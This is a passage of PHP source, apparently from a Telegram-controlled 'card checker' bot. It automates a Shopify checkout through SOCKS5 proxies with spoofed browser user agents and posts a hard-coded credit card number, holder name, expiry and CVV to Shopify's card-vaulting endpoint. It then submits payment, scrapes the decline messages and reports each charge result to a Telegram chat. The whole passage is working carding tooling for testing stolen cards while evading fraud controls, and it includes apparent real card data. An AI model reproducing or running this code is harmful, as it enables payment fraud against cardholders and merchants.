    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, ''.$redirect.'?step=payment_method');
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array(
    'content-type: application/x-www-form-urlencoded',
    'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1',);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    $curl9 = curl_exec($ch);
    $pg = trim(strip_tags(getStr($curl9,'="credit_card"','pay_now">')));
    $pgy = trim(strip_tags(getStr($pg,'data-select-gateway="','"')));
    //file_put_contents('curl9.txt', $curl9);

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙏𝙤𝙠𝙚𝙣 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

#curl10#
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://deposit.us.shopifycs.com/sessions');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    $headers = array(
    'content-type: application/json',
    'Host: deposit.us.shopifycs.com',
    'Origin: https://checkout.shopifycs.com',
    'Referer: https://checkout.shopifycs.com/',
    'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1',);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"4180 8800 0075 4522","name":"Jack Coddrey","month":11,"year":2023,"verification_value":"361"},"payment_session_scope":"'.$domain.'"}');
    $curl10 = curl_exec($ch);
    $pid = trim(strip_tags(getStr($curl10,'id":"','"')));
    
    echo "$pid";
    echo "</br>";
    echo "</br>";
    echo "</br>";

    #curl11#
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, ''.$redirect.'');
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    $headers = array(
    'content-type: application/x-www-form-urlencoded',
    'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$autht3.'&previous_step='.$step3.'&step=&s='.$pid.'&checkout%5Bpayment_gateway%5D='.$pgy.'&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bvault_phone%5D=&checkout%5Btotal_price%5D='.$totalc.'&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1024&checkout%5Bclient_details%5D%5Bbrowser_height%5D=746&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330');
    $curl11 = curl_exec($ch);
    //file_put_contents('curl11.txt', $curl11);

    #curl12#
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, ''.$redirect.'/processing');
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array(
    'content-type: application/x-www-form-urlencoded',
    'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1',);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    $curl12 = curl_exec($ch);

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙄𝙣 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 [0] ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

    #curl13#
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, ''.$redirect.'/processing?from_processing_page=1');
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array(
    'content-type: application/x-www-form-urlencoded',
    'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1',);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    $curl13 = curl_exec($ch);
    $rspppppp = trim(strip_tags(getStr($curl13,'</svg><div class="notice__content"><p class="notice__text">','</p>')));
    //file_put_contents('curl13.txt', $curl13);

    #curl14#
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, ''.$redirect.'?from_processing_page=1&validate=true');
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array(
    'content-type: application/x-www-form-urlencoded',
    'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1',);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    $curl14 = curl_exec($ch);
    $rsppppp = trim(strip_tags(getStr($curl14,'</svg><div class="notice__content"><p class="notice__text">','</p>')));
    curl_close($ch);
    file_put_contents('curl14,2.txt', $curl14);
}
$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝙍𝙚𝙨𝙪𝙡𝙩 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

$end_time = microtime(true);
$time0 = $end_time - $start_time;
$time = substr_replace($time0, '',4);

if ((strpos($curl14, 'notice notice--error')) || (strpos($curl14, 'notice notice--error')) || (strpos($curl10, 'Do Not Honor')) || (strpos($curl9, 'Do Not Honor')) || (strpos($curl14, '</svg><div class="notice__content"><p class="notice__text">')) || (strpos($curl14, '</svg><div class="notice__content"><p class="notice__text">')) || (strpos($curl10, 'declined')) || (strpos($curl14, 'declined'))){
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Status </u> : ❌ Failed To Charge ( $rsppppp )\n\n<b>• Other Info :- </b>\n\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Took ⌛</u> : <code>$time seconds (Retries - $retry_count) </code>\n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
else {
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Status </u> : ❌ Failed To Charge ( $rsppppp )\n\n<b>• Other Info :- </b>\n\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Took ⌛</u> : <code>$time seconds (Retries - $retry_count) </code>\n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
curl_close($ch);
?>